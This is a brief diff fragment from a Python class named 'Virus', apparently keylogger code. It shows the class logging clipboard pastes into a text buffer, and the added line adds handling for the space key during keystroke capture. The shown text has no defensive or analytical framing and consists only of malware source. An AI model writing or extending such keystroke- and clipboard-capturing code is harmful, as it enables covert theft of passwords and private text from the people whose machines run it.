@@ -100,3 +100,4 @@ class Virus(object):
                     self.append_text(f"\x00<^paste: {pyperclip.paste()}>\x00")
 
             elif type(key) == Key:
+                if key.name == "space":
